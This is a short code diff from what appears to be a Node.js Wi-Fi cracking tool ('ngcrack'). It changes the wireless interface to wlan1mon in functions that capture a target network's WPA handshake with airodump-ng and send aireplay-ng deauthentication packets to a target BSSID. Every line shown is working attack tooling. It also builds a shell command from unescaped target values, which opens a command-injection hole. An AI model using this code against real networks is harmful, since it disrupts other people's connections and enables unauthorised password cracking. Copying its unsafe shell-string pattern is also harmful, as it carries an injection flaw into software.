@@ -48,9 +48,9 @@ function monitorOutputFile(filePath, searchString) {
 }
 
 function getPasswordStart(TARGET_ESSID, CHANNEL, TARGET_BSSID) {
-	io.emit('getPasswordMessage', `airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1`);
+	io.emit('getPasswordMessage', `airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1mon`);
 
-    const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1 | awk '/WPA handshake/' > /tmp/ngcrack_output/airodump-output.txt`;
+    const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${TARGET_BSSID} -c ${CHANNEL} -w capture wlan1mon | awk '/WPA handshake/' > /tmp/ngcrack_output/airodump-output.txt`;
 
     airodumpProcess = spawn(command, {
         shell: true
@@ -68,9 +68,9 @@ function getPasswordStart(TARGET_ESSID, CHANNEL, TARGET_BSSID) {
 
 function deauthenticate(TARGET_ESSID, TARGET_BSSID) {
     io.emit('getPasswordMessage', `Starting deauth ...`);
-	io.emit('getPasswordMessage', `aireplay-ng --deauth 3 -a ${TARGET_BSSID} wlan1`);
+	io.emit('getPasswordMessage', `aireplay-ng --deauth 3 -a ${TARGET_BSSID} wlan1mon`);
+	aireplayProcess = executeCommand('aireplay-ng', ['--deauth', '3', '-a', TARGET_BSSID, 'wlan1mon'], '/dev/null');
 
-	aireplayProcess = executeCommand('aireplay-ng', ['--deauth', '3', '-a', TARGET_BSSID, 'wlan1'], '/dev/null');
     aireplayProcesses.push(aireplayProcess);
 }
 
